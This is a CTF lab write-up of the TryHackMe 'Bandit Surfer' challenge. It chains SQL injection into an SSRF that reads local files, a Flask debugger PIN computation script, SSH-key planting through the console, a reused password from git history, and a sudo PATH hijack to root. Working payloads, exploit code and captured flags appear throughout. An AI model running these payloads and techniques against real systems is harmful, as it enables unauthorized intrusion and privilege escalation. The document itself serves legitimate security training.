---
categories:
- Web
date: "2023-12-27"
title: "Write-up of The Bandit Surfer (SideQuest 4 of TryHackMe Advent of Cyber 2023)"
description: "Write-up of Bandit Surfer challenge, SideQuest 4 of TryHackMe Advent of Cyber 2023."
keywords: ["surfingyetiiscomingtotown", "Flask", "PIN", "code", "sqli", "pycurl", "sudo", "bashrc"]
---

After completing day 20 of Advent of Cyber 2023, we notice a QRCode inside one of the calendar PNG image inside the Git repository.
The QRCode links to <https://tryhackme.com/room/surfingyetiiscomingtotown>.

## Step 1: SQL injection into server-side request forgery

After starting this new machine (at `10.10.190.103` in this write-up), we discover a web server on port 8000.
This web service offers to download 3 SVG files.
The service seems to use a server-side code to hint to the browser that it should download a file.
Usually this is done using HTML `download` attributes, so there is something off.
For example, the first image links to <http://10.10.190.103:8000/download?id=1>.

This URL has a user-controllable parameter `id`. Let's try to set `id='`:
<http://10.10.190.103:8000/download?id='>.
The server answers with a server-side HTTP error 500 displaying the **Flask debugger**.
This debug page contains a MySQL exception, **some source code context** for the
exception and **an interactive Python console**.
To use the interactive Python console **we need a PIN-code**,
usually given in the Flask command-line output.

Use the source code context, we are able to retrieve the SQL query:
```python
query = "SELECT url FROM elves where url_id = '%s'" % (file_id)
```

Let's try to inject a bad `url`:
`http://10.10.190.103:8000/download?id=1' AND 1=0 UNION ALL SELECT 'http://127.0.0.1:8000/badurl' WHERE ''='`.
We get another exception and the following code extract:
```python
response_buf = BytesIO()
crl = pycurl.Curl()
crl.setopt(crl.URL, filename)
crl.setopt(crl.WRITEDATA, response_buf)
crl.perform()
crl.close()
file_data = response_buf.getvalue()

resp = Response(file_data)
resp.headers['Content-Type'] = 'image/svg+xml'
```
**The server is using Curl to fetch the URL!**

Curl can also fetch local files using the `file://` URL handler.
**We might have a primitive to get files from the server.**
As we know the path of the Python source code from the exception message, let's fetch it:
`http://10.10.190.103:8000/download?id=1' AND 1=0 UNION ALL SELECT 'file:///home/mcskidy/app/app.py' WHERE ''='`.
It works!

## Step 2: retrieving the Flask console PIN-code

Flask debugger can provide an interactive Python console if the user knows the debug PIN-code.
This PIN-code is not random.
There is already an excellent write-up by [vozec on Hackropole](https://hackropole.fr/fr/writeups/fcsc2023-web-tweedle-dum/4724154c-b0e5-49fb-8b61-06a861131b5c/) which explains how to recover the PIN-code.

We need some information to retrieve the PIN-code:

  - the username running the Flask app,
  - the path to `flask/app.py` module,
  - the output of `str(uuid.getnode())`,
  - the output of `get_machine_id()`.

We already know the username `mcskidy` and the path
`/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py` using previous
debug information.

As we have only a SSRF to fetch files from the server filesystem, let's fetch some files:

  - `http://10.10.190.103:8000/download?id=1' AND 1=0 UNION ALL SELECT 'file:///etc/machine-id' WHERE ''='`

    ```
    aee6189caee449718070b58132f2e4ba
    ```

  - `http://10.10.190.103:8000/download?id=1' AND 1=0 UNION ALL SELECT 'file:///proc/net/dev' WHERE ''='`

    ```
    Inter-|   Receive                                                |  Transmit
     face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
    eth0:  188249    2299    0    0    0     0          0         0  2584267    2337    0    0    0     0       0          0
      lo:  656834     433    0    0    0     0          0         0   656834     433    0    0    0     0       0          0
    ```

  - `http://10.10.190.103:8000/download?id=1' AND 1=0 UNION ALL SELECT 'file:///sys/class/net/eth0/address' WHERE ''='`

    ```
    02:4b:aa:22:06:69
    ```

Using these information, we now know that `uuid.getnode() = 0x024baa220669`
and `get_machine_id() = b"aee6189caee449718070b58132f2e4ba"`.

We now remix Vozec script:
```python
import hashlib
from itertools import chain

probably_public_bits = [
    "mcskidy",
    "flask.app",
    "Flask",
    "/home/mcskidy/.local/lib/python3.8/site-packages/flask/app.py",
]

private_bits = [
    str(0x024BAA220669),
    b"aee6189caee449718070b58132f2e4ba",
]

num = None
rv = None

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

Executing the script yields the PIN-code `811-299-197`.
We enter the PIN-code at <http://10.10.190.103:8000/console> and **we now have a working Python console!**

## Step 3: user takeover

Let's use the Flask Python console to add our SSH key to `mcskidy` user:
```python
import subprocess
subprocess.check_output("echo 'ssh-ed25519 <REDACTED>' >> /home/mcskidy/.ssh/authorized_keys", shell=True)
```

We can now `ssh mcskidy@10.10.190.103`.
**There is a first flag inside `mcskidy` home directory!**

Using `find -mtime` option, we notice that there is a git repository inside `/home/mcskidy/app/`.
Looking at the Git history reveals some secrets:
```diff
mcskidy@proddb:~/app$ git show HEAD~2
commit c1a0b22905cc0da0b5ad88c124125efa626013af
Author: mcskidy <mcskidy@proddb>
Date:   Thu Oct 19 20:02:57 2023 +0000

    Minor update

diff --git a/app.py b/app.py
index 8d05622..5765c7d 100644
--- a/app.py
+++ b/app.py
@@ -10,7 +10,7 @@ app = Flask(__name__, static_url_path='/static')
 # MySQL configuration
 app.config['MYSQL_HOST'] = 'localhost'
 app.config['MYSQL_USER'] = 'mcskidy'
-app.config['MYSQL_PASSWORD'] = 'F453TgvhALjZ'
+app.config['MYSQL_PASSWORD'] = 'fSXT8582GcMLmSt6'
 app.config['MYSQL_DB'] = 'elfimages'
 mysql = MySQL(app)
```

We try these secrets with `sudo -l`.

```
$ sudo -l
[sudo] password for mcskidy:
Matching Defaults entries for mcskidy on proddb:
    env_reset, mail_badpass, secure_path=/home/mcskidy\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mcskidy may run the following commands on proddb:
    (root) /usr/bin/bash /opt/check.sh
```

**`F453TgvhALjZ` is `mcskidy` user password!**

## Step 4: admin takeover

`sudo -l` configuration definitely does not look like the default Debian
configuration. There might be a way to takeover the admin account.

We read the script at `/opt/check.sh`.
This script starts by sourcing `/opt/.bashrc` which itself starts by disabling
the `[` Bash built-in:
```bash
enable -n [ # ]
```
This means that `[` in Bash scripts now refers to `/usr/bin/[`.

We notice that sudo `secure_path` allows to add `/home/mcskidy` to the `PATH`
environment variable.

We create `/home/mcskidy/[` script with a payload that adds our SSH key to
`/root/.ssh/authorized_keys`.
Then:
```
mcskidy@proddb:/opt$ export PATH=/home/mcskidy:$PATH
mcskidy@proddb:/opt$ sudo /usr/bin/bash /opt/check.sh
```

We can now login as root:
```
$ ssh root@10.10.152.209
Last login: Wed Dec 13 18:11:57 2023 from 10.13.4.71
root@proddb:~# l
frosteau/  root.txt  snap/  yetikey4.txt
root@proddb:~# cat root.txt yetikey4.txt
THM{BaNDiT_YeTi_Lik3s_PATH_HijacKing}
4-3f$FEBwD6AoqnyLjJ!!Hk4tc*V6w$UuK#evLWkBp
```

*Voilà!*
